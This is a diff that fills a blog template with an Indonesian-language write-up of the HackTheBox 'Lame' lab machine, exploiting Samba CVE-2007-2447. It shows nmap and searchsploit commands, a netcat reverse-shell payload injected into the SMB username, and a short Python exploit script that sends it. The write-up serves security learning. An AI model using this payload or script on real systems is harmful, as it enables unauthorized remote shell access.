@@ -4,8 +4,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>[PAGE_TITLE]</title>
-    <!-- SEO_TAGS_PLACEHOLDER -->
+    <title>⚠️ | Writeup: Capture The Flag - HackTheBox 'Lame</title>
+    
+    <meta name="description" content="Writeup singkat untuk mesin Lame di HackTheBox. Mesin legendaris yang mengajarkan kita tentang Samba Vulnerability (CVE-2007-2447).">
+    <link rel="canonical" href="https://alterpix.github.io/writeups/dummy_htb_lame.html">
+    
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://alterpix.github.io/writeups/dummy_htb_lame.html">
+    <meta property="og:title" content="Writeup: Capture The Flag - HackTheBox 'Lame">
+    <meta property="og:description" content="Writeup singkat untuk mesin Lame di HackTheBox. Mesin legendaris yang mengajarkan kita tentang Samba Vulnerability (CVE-2007-2447).">
+    <meta property="og:image" content="https://alterpix.github.io/assets/img/og_default.png">
+    
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://alterpix.github.io/writeups/dummy_htb_lame.html">
+    <meta property="twitter:title" content="Writeup: Capture The Flag - HackTheBox 'Lame">
+    <meta property="twitter:description" content="Writeup singkat untuk mesin Lame di HackTheBox. Mesin legendaris yang mengajarkan kita tentang Samba Vulnerability (CVE-2007-2447).">
+    <meta property="twitter:image" content="https://alterpix.github.io/assets/img/og_default.png">
+    
     <link rel="apple-touch-icon" sizes="180x180" href="../favicon/apple-touch-icon.png">
     <link rel="icon" type="image/png" sizes="32x32" href="../favicon/favicon-32x32.png">
     <link rel="icon" type="image/png" sizes="16x16" href="../favicon/favicon-16x16.png">
@@ -26,17 +43,114 @@
     <main class="container">
         <article class="writeup-content">
             <header>
-                <h1>[WRITEUP TITLE HERE]</h1>
+                <h1>Writeup: Capture The Flag - HackTheBox 'Lame</h1>
                 <div class="writeup-meta">
-                    <span>DATE: [YYYY-MM-DD]</span>
+                    <span>DATE: 2026-02-13</span>
                     <span>AUTHOR: Alterpix</span>
-                    <span>CATEGORY: [WEB/NETWORK/CTF]</span>
+                    <span>CATEGORY: Writeup</span>
                 </div>
             </header>
 
             <div class="writeup-body">
-                <!-- DISCLAIMER_PLACEHOLDER -->
-                {{ CONTENT }}
+                
+        <div class="legal-warning">
+            <div class="warning-icon">⚠️ WARNING_</div>
+            <p>
+                The information provided in this article is for <strong>EDUCATIONAL PURPOSES ONLY</strong>.
+                The author is not responsible for any misuse of the information. 
+                Testing these techniques on systems without explicit permission is <strong>ILLEGAL</strong>.
+            </p>
+        </div>
+        
+                <h2>Reconnaissance</h2>
+<p>Langkah pertama seperti biasa adalah scanning network menggunakan Nmap.</p>
+<div class="code-terminal">
+    <div class="terminal-header">
+        <div class="dot red"></div>
+        <div class="dot yellow"></div>
+        <div class="dot green"></div>
+        <div class="title">BASH_SHELL</div>
+    </div>
+    <div class="terminal-body"><div class="codehilite"><pre><span></span><code>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-oA<span class="w"> </span>nmap/lame<span class="w"> </span><span class="m">10</span>.10.10.3
+</code></pre></div></div>
+</div>
+
+<p>Output menunjukkan port yang terbuka:
+*   <strong>21/tcp (FTP)</strong>: vsftpd 2.3.4
+*   <strong>139/tcp, 445/tcp (SMB)</strong>: Samba 3.0.20-Debian</p>
+<h2>Vulnerability Analysis</h2>
+<p>Versi Samba <code>3.0.20</code> sangat tua dan terkenal rentan terhadap <strong>Username Map Script Command Execution</strong> (CVE-2007-2447).</p>
+<p>Kita bisa mencari exploitnya di Metasploit atau searchsploit.</p>
+<div class="code-terminal">
+    <div class="terminal-header">
+        <div class="dot red"></div>
+        <div class="dot yellow"></div>
+        <div class="dot green"></div>
+        <div class="title">TERMINAL</div>
+    </div>
+    <div class="terminal-body"><div class="codehilite"><pre><span></span><code>searchsploit<span class="w"> </span>samba<span class="w"> </span><span class="m">3</span>.0.20
+</code></pre></div></div>
+</div>
+
+<h2>Exploitation</h2>
+<p>Kita akan gunakan exploit manual menggunakan python agar lebih paham cara kerjanya, daripada sekadar klik Metasploit.</p>
+<p>Vulnerability ini terjadi karena input sanitization yang buruk pada username saat login menggunakan protokol SMB. Kita bisa menyisipkan payload shellcode di sana.</p>
+<p>Payload:</p>
+<div class="code-terminal">
+    <div class="terminal-header">
+        <div class="dot red"></div>
+        <div class="dot yellow"></div>
+        <div class="dot green"></div>
+        <div class="title">TERMINAL</div>
+    </div>
+    <div class="terminal-body"><div class="codehilite"><pre><span></span><code><span class="s2">&quot;/=`nohup nc -e /bin/sh 10.10.14.5 4444`&quot;</span>
+</code></pre></div></div>
+</div>
+
+<h3>Script Exploit</h3>
+<p>Berikut adalah potongan script exploit yang saya modifikasi:</p>
+<div class="code-terminal">
+    <div class="terminal-header">
+        <div class="dot red"></div>
+        <div class="dot yellow"></div>
+        <div class="dot green"></div>
+        <div class="title">PYTHON_SCRIPT</div>
+    </div>
+    <div class="terminal-body"><div class="codehilite"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">smb.SMBConnection</span><span class="w"> </span><span class="kn">import</span> <span class="n">SMBConnection</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">exploit</span><span class="p">(</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">shell_payload</span><span class="p">):</span>
+    <span class="n">conn</span> <span class="o">=</span> <span class="n">SMBConnection</span><span class="p">(</span><span class="n">shell_payload</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">conn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">target_ip</span><span class="p">,</span> <span class="mi">139</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Payload sent! Check your listener.&quot;</span><span class="p">)</span>
+
+<span class="n">exploit</span><span class="p">(</span><span class="s2">&quot;10.10.10.3&quot;</span><span class="p">,</span> <span class="s2">&quot;/=`nohup nc -e /bin/sh 10.10.14.5 4444`&quot;</span><span class="p">)</span>
+</code></pre></div></div>
+</div>
+
+<p>Setelah menjalankan script tersebut, kita mendapatkan reverse shell di listener netcat kita!</p>
+<h2>Root Flag</h2>
+<p>User langsung root, jadi tidak perlu privilege escalation.</p>
+<div class="code-terminal">
+    <div class="terminal-header">
+        <div class="dot red"></div>
+        <div class="dot yellow"></div>
+        <div class="dot green"></div>
+        <div class="title">TERMINAL</div>
+    </div>
+    <div class="terminal-body"><div class="codehilite"><pre><span></span><code><span class="nb">cd</span><span class="w"> </span>/root
+cat<span class="w"> </span>root.txt
+<span class="c1"># c4ca4238a0b923820dcc509a6f75849b</span>
+</code></pre></div></div>
+</div>
+
+<h2>Lessons Learned</h2>
+<ol>
+<li>Selalu update service yang terekspos ke internet.</li>
+<li>Jangan biarkan konfigurasi default yang tidak aman.</li>
+<li>SMB adalah protokol yang "berisik" dan sering jadi jalan masuk hacker.</li>
+</ol>
             </div>
 
             <br>
